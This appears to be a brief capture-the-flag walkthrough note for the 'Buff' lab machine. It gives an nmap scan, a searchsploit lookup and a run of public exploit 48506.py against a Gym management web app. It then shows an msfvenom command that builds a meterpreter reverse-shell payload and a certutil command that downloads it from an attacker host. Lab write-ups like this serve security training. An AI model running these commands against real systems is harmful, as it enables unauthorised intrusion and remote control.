----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Buff
# 30/3/2023
10.10.10.198

----------------------------------------------------
# nmap
----------------------------------------------------
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)

----------------------------------------------------
# foothold
----------------------------------------------------
Visiting /contact reveals information about the version of the web application.
http://10.10.10.198:8080/contact.php

└─$ searchsploit Gym         
└─$ python2 48506.py http://10.10.10.198:8080/
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.7 LPORT=4444 -f exe -o shell.exe
"certutil -urlcache -split -f "http://10.10.16.3/shell.exe" shell.exe"
